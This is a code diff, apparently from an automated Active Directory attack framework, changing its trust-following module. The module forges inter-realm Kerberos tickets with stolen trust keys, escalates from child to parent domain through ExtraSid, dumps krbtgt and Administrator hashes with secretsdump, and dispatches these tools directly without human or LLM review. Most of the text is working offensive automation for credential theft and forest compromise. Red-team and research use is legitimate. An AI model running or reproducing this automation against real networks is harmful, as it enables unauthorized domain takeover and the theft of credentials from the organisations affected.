-                            payload["target_sid"] = json!(sid);
-                        }
-                        if let Some(child_krbtgt) = s.hashes.iter().find(|h| {
-                            h.username.eq_ignore_ascii_case("krbtgt")
-                                && h.domain.to_lowercase() == cd_lower
-                                && h.hash_type.to_uppercase() == "NTLM"
-                        }) {
-                            payload["child_krbtgt_hash"] = json!(child_krbtgt.hash_value);
-                        }
-                        let admin_cred = s
-                            .credentials
-                            .iter()
-                            .find(|c| {
-                                c.is_admin
-                                    && !c.password.is_empty()
-                                    && c.domain.to_lowercase() == cd_lower
-                            })
-                            .cloned();
-                        let admin_hash = s
-                            .hashes
-                            .iter()
-                            .find(|h| {
-                                h.username.to_lowercase() == "administrator"
-                                    && h.domain.to_lowercase() == cd_lower
-                                    && h.hash_type.to_uppercase() == "NTLM"
-                            })
-                            .cloned();
-                        let child_dc = s.resolve_dc_ip(&child_domain);
-                        (
-                            s.domain_sids.contains_key(&parent_lower),
-                            s.domain_sids.contains_key(&cd_lower),
-                            admin_cred,
-                            admin_hash,
-                            child_dc,
-                        )
-                    };
-
-                    if !have_target_sid {
-                        if let Some((sid, admin_name)) = super::golden_ticket::resolve_domain_sid(
-                            &parent_domain,
-                            &parent_dc_ip,
-                            child_admin_cred.as_ref(),
-                            child_admin_hash.as_ref(),
-                        )
-                        .await
-                        {
-                            info!(
-                                parent_domain = %parent_domain,
-                                sid = %sid,
-                                "Resolved parent domain SID via lookupsid for child-to-parent ExtraSid"
-                            );
-                            let op_id = { dispatcher.state.read().await.operation_id.clone() };
-                            let reader = ares_core::state::RedisStateReader::new(op_id);
-                            let mut conn = dispatcher.queue.connection();
-                            let _ = reader.set_domain_sid(&mut conn, &parent_lower, &sid).await;
-                            if let Some(ref name) = admin_name {
-                                let _ = reader.set_admin_name(&mut conn, &parent_lower, name).await;
-                            }
-                            {
-                                let mut state = dispatcher.state.write().await;
-                                state.domain_sids.insert(parent_lower.clone(), sid.clone());
-                                if let Some(ref name) = admin_name {
-                                    state.admin_names.insert(parent_lower.clone(), name.clone());
-                                }
-                            }
-                            payload["target_sid"] = json!(sid);
-                            have_target_sid = true;
-                        } else {
-                            warn!(
-                                child_domain = %child_domain,
-                                parent_domain = %parent_domain,
-                                parent_dc_ip = %parent_dc_ip,
-                                "Could not resolve parent SID — deferring child-to-parent dispatch"
-                            );
-                        }
-                    }
-                    if !have_target_sid {
-                        continue;
-                    }
-
-                    // Resolve child domain SID if not cached (needed for ExtraSid golden ticket)
-                    if !have_source_sid {
-                        if let Some(ref child_dc) = child_dc_ip {
-                            if let Some((sid, admin_name)) =
-                                super::golden_ticket::resolve_domain_sid(
-                                    &child_domain,
-                                    child_dc,
-                                    child_admin_cred.as_ref(),
-                                    child_admin_hash.as_ref(),
-                                )
-                                .await
-                            {
-                                info!(
-                                    child_domain = %child_domain,
-                                    sid = %sid,
-                                    "Resolved child domain SID via lookupsid for child-to-parent ExtraSid"
-                                );
-                                let op_id = { dispatcher.state.read().await.operation_id.clone() };
-                                let reader = ares_core::state::RedisStateReader::new(op_id);
-                                let mut conn = dispatcher.queue.connection();
-                                let _ = reader.set_domain_sid(&mut conn, &cd_lower, &sid).await;
-                                if let Some(ref name) = admin_name {
-                                    let _ = reader.set_admin_name(&mut conn, &cd_lower, name).await;
-                                }
-                                {
-                                    let mut state = dispatcher.state.write().await;
-                                    state.domain_sids.insert(cd_lower.clone(), sid.clone());
-                                    if let Some(ref name) = admin_name {
-                                        state.admin_names.insert(cd_lower.clone(), name.clone());
-                                    }
-                                }
-                                payload["source_sid"] = json!(sid);
-                                have_source_sid = true;
-                            } else {
-                                warn!(
-                                    child_domain = %child_domain,
-                                    child_dc_ip = %child_dc,
-                                    "Could not resolve child SID — deferring child-to-parent dispatch"
-                                );
-                            }
-                        } else {
-                            warn!(
-                                child_domain = %child_domain,
-                                "No child DC IP available — deferring child-to-parent dispatch"
-                            );
-                        }
-                    }
-                    if !have_source_sid {
-                        continue;
-                    }
-
-                    // Use raiseChild.py (impacket's canonical child→parent ExtraSid
-                    // automation) via DIRECT tool dispatch (no LLM in the loop).
-                    // This replaces the previous golden_ticket + secretsdump_kerberos
-                    // combo, which fails because impacket's cross-realm referral is
-                    // broken (fortra/impacket#315): a child-realm ticket presented
-                    // to the parent KDC returns KDC_ERR_WRONG_REALM /
-                    // KDC_ERR_PREAUTH_FAILED. raiseChild forges the inter-realm
-                    // chain internally and dumps parent krbtgt + Administrator in
-                    // one shot.
-                    //
-                    // Direct dispatch_tool bypasses the LLM agent loop entirely —
-                    // the orchestrator owns every input (child admin hash, child
-                    // DC IP, parent DC IP), so there is no value in laundering them
-                    // through an LLM that might typo or omit args.
-                    let admin_hash_value = child_admin_hash.as_ref().map(|h| h.hash_value.clone());
-                    let admin_password = child_admin_cred
-                        .as_ref()
-                        .map(|c| c.password.clone())
-                        .filter(|p| !p.is_empty());
-                    if admin_hash_value.is_none() && admin_password.is_none() {
-                        warn!(
-                            child_domain = %child_domain,
-                            parent_domain = %parent_domain,
-                            "No child Administrator hash or password — deferring child-to-parent (raise_child needs auth)"
-                        );
-                        continue;
-                    }
-
-                    // raiseChild auto-discovers parent forest root via the
-                    // child DC's trustedDomain LDAP objects and resolves DC IPs
-                    // via DNS — script-level flags for IP/domain are unsupported
-                    // (argparse exit 2). However, on workers without forest DNS,
-                    // the bare domain FQDN (`child.contoso.local`) won't
-                    // resolve — so pass the IPs so the tool wrapper can
-                    // pre-seed `/etc/hosts` before invoking impacket.
-                    let mut raise_args = json!({
-                        "child_domain": child_domain.clone(),
-                        "username": "Administrator",
-                    });
-                    if let Some(h) = admin_hash_value {
-                        raise_args["hash"] = json!(h);
-                    } else if let Some(p) = admin_password {
-                        raise_args["password"] = json!(p);
-                    }
-                    if let Some(ref ip) = child_dc_ip {
-                        raise_args["child_dc_ip"] = json!(ip);
-                    }
-                    raise_args["parent_domain"] = json!(parent_domain.clone());
-                    if !parent_dc_ip.is_empty() {
-                        raise_args["parent_dc_ip"] = json!(parent_dc_ip.clone());
-                    }
-
-                    let call = ToolCall {
-                        id: format!("raise_child_{}", uuid::Uuid::new_v4().simple()),
-                        name: "raise_child".to_string(),
-                        arguments: raise_args,
-                    };
-                    let task_id = format!(
-                        "trust_raise_child_{}",
-                        &uuid::Uuid::new_v4().simple().to_string()[..12]
-                    );
-
-                    // Mark dedup BEFORE spawning so the next 30s tick doesn't
-                    // re-dispatch the same trust while raiseChild is running.
-                    dispatcher
-                        .state
-                        .write()
-                        .await
-                        .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
-                    let _ = dispatcher
-                        .state
-                        .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
-                        .await;
-
-                    info!(
-                        task_id = %task_id,
-                        child_domain = %child_domain,
-                        parent_domain = %parent_domain,
-                        auth = auth_method,
-                        "Dispatching raise_child (direct tool, no LLM)"
-                    );
-
-                    // Spawn so the trust loop continues processing other items
-                    // while raiseChild runs (typically 30–120s). mark_exploited
-                    // is gated on observed parent krbtgt — no premature marking.
-                    let dispatcher_bg = dispatcher.clone();
-                    let parent_domain_bg = parent_domain.clone();
-                    let child_domain_bg = child_domain.clone();
-                    let vuln_id_bg = vuln_id.clone();
-                    let key_bg = key.clone();
-                    tokio::spawn(async move {
-                        let result = dispatcher_bg
-                            .llm_runner
-                            .tool_dispatcher()
-                            .dispatch_tool("privesc", &task_id, &call)
-                            .await;
-                        let clear_dedup = || async {
-                            dispatcher_bg
-                                .state
-                                .write()
-                                .await
-                                .unmark_processed(DEDUP_TRUST_FOLLOW, &key_bg);
-                            let _ = dispatcher_bg
-                                .state
-                                .unpersist_dedup(&dispatcher_bg.queue, DEDUP_TRUST_FOLLOW, &key_bg)
-                                .await;
-                        };
-                        match result {
-                            Ok(exec_result) => {
-                                if let Some(err) = exec_result.error.as_ref() {
-                                    let tail: String = exec_result
-                                        .output
-                                        .chars()
-                                        .rev()
-                                        .take(2000)
-                                        .collect::<String>()
-                                        .chars()
-                                        .rev()
-                                        .collect();
-                                    warn!(
-                                        err = %err,
-                                        child_domain = %child_domain_bg,
-                                        parent_domain = %parent_domain_bg,
-                                        output_tail = %tail,
-                                        "raise_child returned error — clearing dedup for retry"
-                                    );
-                                    clear_dedup().await;
-                                    return;
-                                }
-                                // Verify parent compromise — only mark exploited
-                                // when we actually observe parent krbtgt.
-                                //
-                                // Inspect exec_result.discoveries directly:
-                                // dispatch_tool returns BEFORE push_realtime_discoveries
-                                // finishes pumping hashes into state.hashes, so reading
-                                // state here is too early and produces a false negative.
-                                let parent_lower = parent_domain_bg.to_lowercase();
-                                let has_parent_krbtgt = exec_result
-                                    .discoveries
-                                    .as_ref()
-                                    .and_then(|d| d.get("hashes"))
-                                    .and_then(|h| h.as_array())
-                                    .map(|hashes| {
-                                        hashes.iter().any(|h| {
-                                            let user = h
-                                                .get("username")
-                                                .and_then(|v| v.as_str())
-                                                .unwrap_or("");
-                                            let dom = h
-                                                .get("domain")
-                                                .and_then(|v| v.as_str())
-                                                .unwrap_or("");
-                                            let htype = h
-                                                .get("hash_type")
-                                                .and_then(|v| v.as_str())
-                                                .unwrap_or("");
-                                            user.eq_ignore_ascii_case("krbtgt")
-                                                && dom.to_lowercase() == parent_lower
-                                                && htype.eq_ignore_ascii_case("ntlm")
-                                        })
-                                    })
-                                    .unwrap_or(false);
-                                let tail_for_log: String = exec_result
-                                    .output
-                                    .chars()
-                                    .rev()
-                                    .take(2000)
-                                    .collect::<String>()
-                                    .chars()
-                                    .rev()
-                                    .collect();
-                                if has_parent_krbtgt {
-                                    info!(
-                                        parent_domain = %parent_domain_bg,
-                                        "raise_child compromised parent — marking exploited"
-                                    );
-                                    let _ = dispatcher_bg
-                                        .state
-                                        .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
-                                        .await;
-                                    let techniques =
-                                        vec!["T1134.005".to_string(), "T1003.006".to_string()];
-                                    let event_id = format!(
-                                        "evt-raise-child-{}",
-                                        &uuid::Uuid::new_v4().simple().to_string()[..8]
-                                    );
-                                    let event = serde_json::json!({
-                                        "id": event_id,
-                                        "timestamp": chrono::Utc::now().to_rfc3339(),
-                                        "source": "trust_automation",
-                                        "description": format!(
-                                            "Child-to-parent ExtraSid escalation: {} \u{2192} {} via raiseChild",
-                                            child_domain_bg, parent_domain_bg
-                                        ),
-                                        "mitre_techniques": techniques,
-                                    });
-                                    let _ = dispatcher_bg
-                                        .state
-                                        .persist_timeline_event(
-                                            &dispatcher_bg.queue,
-                                            &event,
-                                            &techniques,
-                                        )
-                                        .await;
-                                } else {
-                                    warn!(
-                                        parent_domain = %parent_domain_bg,
-                                        output_tail = %tail_for_log,
-                                        "raise_child completed but no parent krbtgt observed — NOT marking exploited"
-                                    );
-                                }
-                            }
-                            Err(e) => {
-                                warn!(
-                                    err = %e,
-                                    child_domain = %child_domain_bg,
-                                    parent_domain = %parent_domain_bg,
-                                    "raise_child dispatch errored — clearing dedup for retry"
-                                );
-                                clear_dedup().await;
-                            }
-                        }
-                    });
-                }
-            }
-        }
-
-        // Extract trust keys for known cross-forest trusts
+        // The legacy `raise_child` (impacket raiseChild.py) child→parent
+        // path was retired here: impacket's cross-realm referral is broken
+        // (fortra/impacket#315) and the wrapper trips KDC_ERR_TGT_REVOKED
+        // on Win2016+ parent KDCs with no recovery.
         {
             let state = dispatcher.state.read().await;
             if state.has_domain_admin && !state.trusted_domains.is_empty() {
-                // Collect trust work with per-trust source domain:
-                // use a dominated domain that has a known DC (excluding the trust target).
-                // IMPORTANT: prefer the forest root DC — trust accounts (e.g. FOREIGNDOMAIN$)
-                // live on the forest root DC, not child domain DCs. A secretsdump with
-                // -just-dc-user FOREIGNDOMAIN$ against a child DC returns nothing.
                 let extract_work: Vec<(String, String, String, String, String)> = state
                     .trusted_domains
                     .values()
-                    .filter(|trust| trust.is_cross_forest())
                     .filter_map(|trust| {
                         let key = format!("trust_extract:{}", trust.domain.to_lowercase());
                         if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
@@ -1378,8 +1175,14 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         payload["hash_value"] = json!(hash.hash_value);
                     }
 
+                    // Priority 7 (on par with auto_credential_access's primary
+                    // secretsdump): the trust key — and specifically its AES256
+                    // variant — is the critical-path unlock for the entire
+                    // target forest. At priority 2 it lost to routine enum and
+                    // landed minutes after the forge had already given up and
+                    // fired an RC4-only ticket that an AES-only DC rejects.
                     match dispatcher
-                        .throttled_submit("credential_access", "credential_access", payload, 2)
+                        .throttled_submit("credential_access", "credential_access", payload, 7)
                         .await
                     {
                         Ok(Some(task_id)) => {
@@ -1438,10 +1241,37 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             // ensures we forge with the up-to-date trust key by default and
             // only fall back to a history key if the current one's dedup
             // already cleared (operator retry path).
+            //
+            // `is_trust_key` outranks both. A machine account named `<LABEL>$`
+            // is not automatically the inter-realm trust key: shadow-credential
+            // and ADCS takeovers of the *computer object* yield that account's
+            // NT hash, which shares the name but is a different secret. Forging
+            // with one is guaranteed KRB_AP_ERR_BAD_INTEGRITY — one cross-forest
+            // run burned 26 dispatches and 125 retries on exactly that row. The
+            // secretsdump parser stamps `is_trust_key` on real forging material,
+            // so prefer it and drop the impostors below.
             let mut hashes_sorted: Vec<&ares_core::models::Hash> = state.hashes.iter().collect();
-            hashes_sorted.sort_by_key(|h| h.is_previous as u8);
+            hashes_sorted.sort_by_key(|h| (!h.is_trust_key as u8, h.is_previous as u8));
 
-            let items = hashes_sorted
+            // Accounts we hold confirmed trust material for, keyed as the work
+            // items are: `(source_domain_lower, username_lower)`. Only used to
+            // reject same-named non-trust rows, so an account with no stamped
+            // row anywhere still falls through to the old name-shape behaviour
+            // (older ops and LSA-secret rows predate the flag).
+            let trust_stamped: HashSet<(String, String)> = state
+                .hashes
+                .iter()
+                .filter(|h| h.is_trust_key)
+                .map(|h| (h.domain.to_lowercase(), h.username.to_lowercase()))
+                .collect();
+
+            // One dispatch per trust, not one per matching row. `dedup_key`
+            // lowercases the account, so `FABRIKAM$` and `fabrikam$` collapse to the
+            // same trust — but both rows survive collection and the dedup mark
+            // is only stamped at dispatch, so without this the tick fires the
+            // forge twice. The sort above already put the best row first.
+            let mut seen: HashSet<String> = HashSet::new();
+            let items: Vec<TrustFollowWork> = hashes_sorted
                 .into_iter()
                 .filter_map(|hash| {
                     if !hash.username.ends_with('$') {
@@ -1452,7 +1282,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
 
                     // Resolve source domain — fall back to first dominated domain
                     // with a DC when secretsdump output lacks domain prefix
-                    let source_domain = if hash.domain.is_empty() {
+                    let source_domain_raw = if hash.domain.is_empty() {
                         state
                             .domain_controllers
                             .keys()
@@ -1462,10 +1292,29 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     } else {
                         hash.domain.clone()
                     };
-                    if source_domain.is_empty() {
+                    if source_domain_raw.is_empty() {
                         return None;
                     }
+                    // Canonicalize: secretsdump can emit `hash.domain="NORTH"`
+                    // (NetBIOS flat) when the parent suffix isn't visible to the
+                    // parser. Downstream lookups against `domain_sids` /
+                    // `domain_controllers` are FQDN-keyed, so the flat label
+                    // misses every cache and the cross-forest forge defers
+                    // forever. Skip the item when the label can't be resolved
+                    // to a known FQDN rather than guessing.
+                    let source_domain = canonicalize_domain_label(&source_domain_raw, &state)?;
                     let source_lower = source_domain.to_lowercase();
+
+                    // Same name, different secret — a computer-object takeover
+                    // of `<LABEL>$` is not the inter-realm trust key. Reject it
+                    // only when a stamped trust row for that account exists, so
+                    // unstamped-but-genuine material still gets its chance.
+                    if !hash.is_trust_key
+                        && trust_stamped
+                            .contains(&(hash.domain.to_lowercase(), hash.username.to_lowercase()))
+                    {
+                        return None;
+                    }
 
                     // Resolve target FQDN in three tiers:
                     //   1. Explicit TrustInfo from prior LDAP trust enum.
@@ -1534,9 +1383,44 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         target_domain_sid,
                     })
                 })
+                .filter(|i: &TrustFollowWork| seen.insert(i.dedup_key.clone()))
                 .collect();
 
             items
+        };
+
+        // Vuln-driven fallback: rebuild work items directly from
+        // `discovered_vulnerabilities`. The hash-iteration above can silently
+        // drop a valid forest_trust_escalation when one of its FQDN heuristics
+        // fails — the analyzer that produced the vuln has the resolved
+        // target_dc_ip on hand, so this path closes the gap.
+        let work: Vec<TrustFollowWork> = {
+            let state = dispatcher.state.read().await;
+            let vuln_items = collect_trust_follow_work_from_vulns(&state);
+            drop(state);
+
+            let hash_keys: HashSet<String> = work.iter().map(|w| w.dedup_key.clone()).collect();
+            for vi in &vuln_items {
+                if !hash_keys.contains(&vi.dedup_key) {
+                    info!(
+                        source = %vi.source_domain,
+                        target = %vi.target_domain,
+                        trust_account = %vi.hash.username,
+                        target_dc_ip = ?vi.target_dc_ip,
+                        "auto_trust_follow: vuln-driven fallback added forest_trust_escalation work item missed by hash iteration"
+                    );
+                }
+            }
+
+            // Vuln-driven items first so a duplicate dedup_key wins with the
+            // analyzer's resolved target_dc_ip rather than the hash path's
+            // possibly-None one.
+            let mut seen = HashSet::new();
+            vuln_items
+                .into_iter()
+                .chain(work)
+                .filter(|w| seen.insert(w.dedup_key.clone()))
+                .collect()
         };
 
         for item in work {
@@ -1581,11 +1465,11 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             // Suppress the ExtraSid forge when the trust has SID filtering
             // active. ticketer adds Enterprise Admins (RID 519) via
             // `--extra-sid` to satisfy DCSync — but a SID-filtered forest
-            // trust strips RID<1000 SIDs from the cross-realm PAC, and the
+            // trust strips the injected SID from the cross-realm PAC, and the
             // target KDC returns rpc_s_access_denied. Burn the dedup so this
-            // doomed dispatch can't loop, mark the vuln exploited as a
-            // strategic choice, and wake the cross-forest fallback paths
-            // (ACL/MSSQL/FSP) to take over.
+            // doomed dispatch can't loop, then wake the cross-forest fallback
+            // paths (ACL/MSSQL/FSP) to take over. The vuln is left unexploited
+            // — only a target krbtgt capture proves compromise.
             {
                 let state = dispatcher.state.read().await;
                 if is_filtered_inter_forest_trust(&state, &item.source_domain, &item.target_domain)
@@ -1655,27 +1539,21 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             // orchestrator already owns every input; deliver them directly.
             //
             // Resolve the target DC hostname so Kerberos auth can match the
-            // SPN baked into the ticket. Falls back to the IP, which works
-            // when the worker can reverse-resolve via DNS.
+            // SPN baked into the ticket. Reject zone-apex A records where
+            // `hostname == target_domain`: the KDC has no `cifs/<bare-domain>`
+            // SPN registered, so the forged TGS request returns
+            // KDC_ERR_S_PRINCIPAL_UNKNOWN. A real DC FQDN carries a leading
+            // label (e.g. `dc01.contoso.local`). Falls back to the IP as a
+            // last resort.
             let target_dc_hostname = {
                 let s = dispatcher.state.read().await;
-                s.hosts
-                    .iter()
-                    .find(|h| h.ip == target_dc_ip && !h.hostname.is_empty())
-                    .map(|h| h.hostname.clone())
-                    .or_else(|| {
-                        s.hosts
-                            .iter()
-                            .find(|h| {
-                                (h.is_dc || h.detect_dc())
-                                    && h.hostname.to_lowercase().ends_with(&format!(
-                                        ".{}",
-                                        item.target_domain.to_lowercase()
-                                    ))
-                            })
-                            .map(|h| h.hostname.clone())
-                    })
-                    .unwrap_or_else(|| target_dc_ip.clone())
+                resolve_target_dc_hostname(
+                    &s.hosts,
+                    &s.netbios_to_fqdn,
+                    &s.domains,
+                    &target_dc_ip,
+                    &item.target_domain,
+                )
             };
 
             // ticketer writes <username>.ccache in the worker cwd; the
@@ -1977,18 +1855,25 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             );
 
             // Mark dedup BEFORE spawning so the next 30s tick doesn't
-            // re-dispatch the same trust while the forge is running.
-            dispatcher
-                .state
-                .write()
-                .await
-                .mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
+            // re-dispatch the same trust while the forge is running. Also
+            // record the mark timestamp in `forge_in_flight` so the staleness
+            // sweep at the top of each tick can recover from the case where
+            // the spawn never actually runs the tool.
+            {
+                let mut state = dispatcher.state.write().await;
+                state.mark_processed(DEDUP_TRUST_FOLLOW, item.dedup_key.clone());
+                state
+                    .forge_in_flight
+                    .insert(item.dedup_key.clone(), Instant::now());
+            }
             let _ = dispatcher
                 .state
                 .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &item.dedup_key)
                 .await;
 
             info!(
+                convergence_stage = 4,
+                event = "forge_inter_realm_and_dump_dispatched",
                 task_id = %task_id,
                 trust_account = %item.hash.username,
                 source_domain = %item.source_domain,
@@ -1996,7 +1881,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 has_source_sid = source_domain_sid.is_some(),
                 has_target_sid = target_domain_sid.is_some(),
                 has_aes = resolved_aes_key.is_some(),
-                "Cross-forest forge dispatched (direct tool, no LLM)"
+                "convergence: forge_inter_realm_and_dump dispatched (ticketer + secretsdump against target-realm DC, direct tool, no LLM)"
             );
 
             let dispatcher_bg = dispatcher.clone();
@@ -2008,6 +1893,9 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             let trust_key_bg = item.hash.hash_value.clone();
             let aes_key_bg = resolved_aes_key.clone();
             let source_domain_sid_bg = source_domain_sid.clone();
+            let is_child_to_parent_bg = is_child_to_parent;
+            let target_dc_ip_bg = target_dc_ip.clone();
+            let target_dc_hostname_bg = target_dc_hostname.clone();
             tokio::spawn(async move {
                 let result = dispatcher_bg
                     .llm_runner
@@ -2015,13 +1903,15 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     .dispatch_tool("privesc", &task_id, &call)
                     .await;
                 // Clear dedup on failure so the next 30s tick can retry once
-                // a fresh trust key, AES key, or SID becomes available.
+                // a fresh trust key, AES key, or SID becomes available. Also
+                // drop the `forge_in_flight` heartbeat so the staleness sweep
+                // doesn't double-clear after we've already cleared.
                 let clear_dedup = || async {
-                    dispatcher_bg
-                        .state
-                        .write()
-                        .await
-                        .unmark_processed(DEDUP_TRUST_FOLLOW, &dedup_key_bg);
+                    {
+                        let mut state = dispatcher_bg.state.write().await;
+                        state.forge_in_flight.remove(&dedup_key_bg);
+                        state.unmark_processed(DEDUP_TRUST_FOLLOW, &dedup_key_bg);
+                    }
                     let _ = dispatcher_bg
                         .state
                         .unpersist_dedup(&dispatcher_bg.queue, DEDUP_TRUST_FOLLOW, &dedup_key_bg)
@@ -2030,7 +1920,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 match result {
                     Ok(exec_result) => {
                         if let Some(err) = exec_result.error.as_ref() {
-                            let tail: String = exec_result
+                            let raw_tail: String = exec_result
                                 .output
                                 .chars()
                                 .rev()
@@ -2039,6 +1929,47 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                 .chars()
                                 .rev()
                                 .collect();
+                            let tail = ares_tools::redact::redact_text(&raw_tail);
+                            // Deterministic-failure signatures that will NOT
+                            // heal on the next 30s tick — the target DC's
+                            // Kerberos database won't sprout a `cifs/<apex>`
+                            // SPN, and impacket won't grow support for a
+                            // malformed target on retry. Keep dedup marked so
+                            // the wrapper doesn't hot-loop (we've seen 363
+                            // retries in ~50 min from this exact signature).
+                            //
+                            // KDC_ERR_WRONG_REALM belongs here too: it means
+                            // we asked this KDC for a principal in a realm it
+                            // does not serve, which is a wrong-target SPN by
+                            // another name. Retrying re-sends the identical
+                            // request; only new recon state can change the
+                            // answer. Left unlocked it cost 131 retries in 65
+                            // min against a child DC picked for a parent forge.
+                            let wrong_target_spn = tail.contains("KDC_ERR_S_PRINCIPAL_UNKNOWN")
+                                || tail.contains("KDC_ERR_WRONG_REALM");
+                            if wrong_target_spn {
+                                warn!(
+                                    err = %err,
+                                    source_domain = %source_domain_bg,
+                                    target_domain = %target_domain_bg,
+                                    trust_account = %trust_account_bg,
+                                    output_tail = %tail,
+                                    "forge_inter_realm_and_dump: wrong-target SPN (KDC_ERR_S_PRINCIPAL_UNKNOWN / KDC_ERR_WRONG_REALM) — apex, malformed, or wrong-realm target; locking dedup (recon must persist a real DC FQDN in the target domain before retry can succeed)"
+                                );
+                                {
+                                    let mut state = dispatcher_bg.state.write().await;
+                                    state.forge_in_flight.remove(&dedup_key_bg);
+                                    state.forge_wedged.insert(
+                                        dedup_key_bg.clone(),
+                                        WedgedForge {
+                                            target_domain: target_domain_bg.clone(),
+                                            target_dc_ip: target_dc_ip_bg.clone(),
+                                            hostname: target_dc_hostname_bg.clone(),
+                                        },
+                                    );
+                                }
+                                return;
+                            }
                             warn!(
                                 err = %err,
                                 source_domain = %source_domain_bg,
@@ -2077,13 +2008,18 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                             info!(
                                 source_domain = %source_domain_bg,
                                 target_domain = %target_domain_bg,
-                                "Cross-forest forge compromised target — marking exploited"
+                                child_to_parent = is_child_to_parent_bg,
+                                "Trust forge compromised target — marking exploited"
                             );
                             let _ = dispatcher_bg
                                 .state
                                 .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
                                 .await;
-                            let techniques = vec!["T1134.005".to_string(), "T1550.003".to_string()];
+                            let (description, techniques) = trust_escalation_event_fields(
+                                &source_domain_bg,
+                                &target_domain_bg,
+                                &trust_account_bg,
+                            );
                             let event_id = format!(
                                 "evt-trust-{}",
                                 &uuid::Uuid::new_v4().simple().to_string()[..8]
@@ -2092,10 +2028,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                 "id": event_id,
                                 "timestamp": chrono::Utc::now().to_rfc3339(),
                                 "source": "trust_automation",
-                                "description": format!(
-                                    "Forest trust escalation: {} \u{2192} {} via trust key {}",
-                                    source_domain_bg, target_domain_bg, trust_account_bg
-                                ),
+                                "description": description,
                                 "mitre_techniques": techniques,
                             });
                             let _ = dispatcher_bg
@@ -2108,11 +2041,11 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                             // (SID filtering, denied permissions, or wrong
                             // forest) that won't change on the next 30s tick.
                             // Keep dedup MARKED so we don't relitigate the
-                            // doomed forge in a tight loop, mark the trust
-                            // vuln exploited so the operation moves on, and
-                            // wake the cross-forest fallback paths
-                            // (ACL/MSSQL/FSP) which can still compromise the
-                            // target forest without ExtraSid.
+                            // doomed forge in a tight loop, leave the trust
+                            // vuln UNexploited (only a target krbtgt capture
+                            // proves compromise), and wake the cross-forest
+                            // fallback paths (ACL/MSSQL/FSP) which can still
+                            // compromise the target forest without ExtraSid.
                             //
                             // Surface tool stdout tail + a hash-count summary so
                             // post-mortem can distinguish silent nxc failure
@@ -2121,7 +2054,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                             // partial dumps (got hashes but no krbtgt — usually
                             // a cross-forest no-ExtraSid case where the target
                             // KDC issued a TGS but DRSUAPI rejected replication).
-                            let tail: String = exec_result
+                            let raw_tail: String = exec_result
                                 .output
                                 .chars()
                                 .rev()
@@ -2130,6 +2063,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                 .chars()
                                 .rev()
                                 .collect();
+                            let tail = ares_tools::redact::redact_text(&raw_tail);
                             let hash_count = exec_result
                                 .discoveries
                                 .as_ref()
@@ -2137,6 +2071,48 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                                 .and_then(|h| h.as_array())
                                 .map(|a| a.len())
                                 .unwrap_or(0);
+
+                            // Recoverable case: this forge fired NTLM-only
+                            // (`aes_key_bg` is None — the AES256 trust key hadn't
+                            // upserted when the AES wait expired) and the dump
+                            // came back empty. Against a cross-forest target that
+                            // is almost always the RC4/etype rejection an AES-only
+                            // forest returns (KDC_ERR_ETYPE_NOSUPP), NOT SID
+                            // filtering — locking dedup here strands the pivot
+                            // even after the trust-key extraction lands AES.
+                            // Instead clear dedup and reset the AES wait so a
+                            // later tick re-forges WITH -aesKey once AES is in
+                            // state. Bounded by `forge_ntlm_fallback_attempts`
+                            // (each retry is gated behind a fresh ~3 min AES wait,
+                            // so this is not a hot-loop) so a target where AES
+                            // genuinely never arrives eventually locks.
+                            if aes_key_bg.is_none() {
+                                const MAX_NTLM_FORGE_ATTEMPTS: u32 = 3;
+                                let attempts = {
+                                    let mut state = dispatcher_bg.state.write().await;
+                                    let c = state
+                                        .forge_ntlm_fallback_attempts
+                                        .entry(dedup_key_bg.clone())
+                                        .or_insert(0);
+                                    *c += 1;
+                                    *c
+                                };
+                                if attempts <= MAX_NTLM_FORGE_ATTEMPTS {
+                                    warn!(
+                                        source_domain = %source_domain_bg,
+                                        target_domain = %target_domain_bg,
+                                        attempts,
+                                        "NTLM-only cross-forest forge returned zero hashes (likely AES-only target rejecting the RC4 inter-realm ticket) — clearing dedup and resetting the AES wait to re-forge once the AES256 trust key lands"
+                                    );
+                                    {
+                                        let mut state = dispatcher_bg.state.write().await;
+                                        state.forge_aes_defers.remove(&dedup_key_bg);
+                                    }
+                                    clear_dedup().await;
+                                    return;
+                                }
+                            }
+
                             warn!(
                                 source_domain = %source_domain_bg,
                                 target_domain = %target_domain_bg,
@@ -2145,6 +2121,35 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
